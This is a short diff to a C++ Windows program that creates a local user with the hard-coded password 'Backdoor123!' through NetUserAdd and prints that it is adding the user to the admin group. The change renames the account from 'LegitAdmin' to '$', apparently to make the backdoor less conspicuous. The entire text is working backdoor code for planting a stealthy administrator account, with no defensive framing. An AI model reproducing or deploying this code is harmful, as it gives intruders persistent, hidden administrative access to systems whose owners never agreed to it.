@@ -4,7 +4,7 @@
 #pragma comment(lib,"Netapi32.lib")
 
 using namespace std;
-wstring name = L"LegitAdmin";
+wstring name = L"$";
 LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
 wstring password = L"Backdoor123!";
 LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
@@ -28,8 +28,8 @@ int main()
     adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
     if (!adduserStatus)
     {
-        cout << "User LegitAdmin with Password Backdoor123 successfully added \n";
-        cout << "adding LegitAdmin to admin group now..\n";
+        cout << "User $ with Password Backdoor123 successfully added \n";
+        cout << "adding $ to admin group now..\n";
     }
     else
     {
